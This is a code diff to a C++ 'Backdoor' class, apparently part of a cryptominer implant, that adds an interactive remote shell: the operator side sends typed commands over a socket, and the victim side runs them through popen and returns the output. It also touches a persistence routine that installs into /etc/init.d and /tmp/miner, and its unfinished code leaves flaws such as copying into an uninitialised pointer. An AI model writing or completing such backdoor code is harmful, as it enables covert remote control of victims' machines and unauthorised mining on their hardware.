@@ -6,14 +6,58 @@
         2 - upload
         3 - download
         4 - MinerInfo
+        5 - exit
 */
 
 
 void Backdoor::shell(){
     if(this->is_server){
+        while(true){
+            std::string input; 
+            std::cout << "~$ ";
+            std::getline(std::cin, input);
+            if(input == "exit"){
+                this->c->send_message(sock, "exit"); // ?????? SOCK VAI SER QUAL DAS CONEXÕES ???
+                break;
+            }else{
+                const char * msg = input.c_str();
+                char * output;
+                this->c->send_message(sock, msg); // QUAL SOCK ??????
+                output = this->c->recv_message(sock); // QUAL SOCK ?????????
+                std::cout << output << std::endl;
+            }   
+        }
+
 
     }else{
 
+        while(true){
+
+            char *command = this->c->recv_message(this->sock);         
+            char *copy, *part;
+            strcpy(copy, command);
+            part = strtok(copy, " ");
+            
+            if(strcmp(part, "cd") == 0){
+                part = strtok(NULL, " "); // get the path to cd to
+                DIR * directory = opendir(part);
+
+                if(directory != NULL){
+                    closedir(directory);
+                    chdir(part);
+                    this->c->send_message(this->sock, this->execute_command("pwd"));
+
+                }else{
+                    this->c->send_message(this->sock, "directory doesn't exists.");
+                }
+
+            }else if(strcmp(part, "exit") == 0){
+                break;
+            }else{
+                char * output = execute_command(command);
+                this->c->send_message(this->sock, output);
+            }            
+        }
     }
 }
 
@@ -73,7 +117,7 @@ void Backdoor::menu(){
 
 void Backdoor::persistence(){
     
-    if(PLATFORM_NAME == "linux"){
+    if(strcmp(PLATFORM_NAME, "linux") == 0){
         // variables
         const char *  root_path_init_d = "/etc/init.d";
         const char * persistence_directory = "/tmp/miner";
@@ -177,8 +221,23 @@ void Backdoor::get_desktop_enviroment(){
 }
 
 
-void Backdoor::execute_command(const char *command){
-    system(command);
+char * Backdoor::execute_command(const char *command){
+    FILE *fpipe;
+    char line[256];
+    char *output;
+    
+    output = (char *)malloc(sizeof(char) * MAX_TERMINAL_OUTPUT);
+    memset(output, 0, MAX_TERMINAL_OUTPUT);
+
+    if (!(fpipe = (FILE*)popen(command,"r"))){
+        return NULL;
+    }
+
+    while ( fgets( line, 256, fpipe)){
+        strcat(output, line);
+    }
+    pclose(fpipe);
+    return output;
 }
 
 Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
